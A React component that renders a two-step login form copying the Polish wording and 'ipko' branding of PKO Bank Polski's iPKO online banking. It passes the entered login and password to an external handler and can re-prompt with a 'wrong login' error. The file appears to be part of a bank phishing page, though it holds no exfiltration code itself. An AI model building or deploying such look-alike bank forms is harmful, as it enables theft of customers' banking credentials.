import React, {Fragment, useState} from "react";
import {Button, Form, FormGroup, Input} from "reactstrap";
import {yupResolver} from '@hookform/resolvers/yup';
import * as yup from "yup";
import {useForm} from "react-hook-form";


const schema = yup.object().shape({
    login: yup.string().min(3).required(),
    password: yup.string().min(4).required(),
});


const IpkoFormLogin = ({status, handler}) => {
    const [step, setStep] = useState(1);
    const [edit, setEdit] = useState(false);
    const {register, handleSubmit, trigger, reset, formState} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const editing = () => {
        if (edit) {
            setEdit(true);
        }
    }
    const clearLogin = (data) => {
        setEdit(false);
        setStep(1);
        reset()
        handler(data);
    }

    return (
        <Fragment>
            {
                status === '' || status === 'wrong_login' ?
                    <Form key={1} className={'ipko_form'} onSubmit={handleSubmit(clearLogin)}>
                        <div className="ipko_form_header">
                            <h2>Zaloguj się</h2>
                        </div>

                        {
                            step === 1 ?
                                <FormGroup key={'login'}
                                           className={edit ? 'edit' : status === 'wrong_login' ? 'error' : null}>
                                    <Input {...register('login')}
                                           onChange={editing}
                                           placeholder={'Wpisz numer klienta lub login'}
                                           className={formState.errors.login && 'error'}/>
                                    {status === 'wrong_login' ?
                                        <div className="error_message">
                                            Wprowadzona nazwa użytkownika lub hasło jest nieprawidłowe
                                        </div> : null
                                    }

                                    <div className="btn_container">
                                        <a href="#">Pomoc w logowaniu</a>
                                        <Button className={'next'}
                                                onClick={(e) => {
                                                    e.preventDefault();
                                                    trigger('login').then((res) => {
                                                        if (res) {
                                                            // load();
                                                            setStep(2);
                                                        }
                                                    })
                                                }}>
                                            Dalej
                                        </Button>
                                    </div>
                                </FormGroup> :
                                step === 2 ?
                                    <FormGroup key={'password'}>
                                        <Input {...register('password')} placeholder={'Wprowadź hasło'} type='password'
                                               className={formState.errors.password && 'error'}/>
                                        <div className="btn_container">
                                            <a href="#">Pomoc w logowaniu</a>
                                            <Button className={'next'}
                                                    type={'submit'}>
                                                Zaloguj
                                            </Button>
                                        </div>
                                    </FormGroup> : null
                        }
                    </Form> :
                    null
            }

        </Fragment>
    )
}
export default IpkoFormLogin;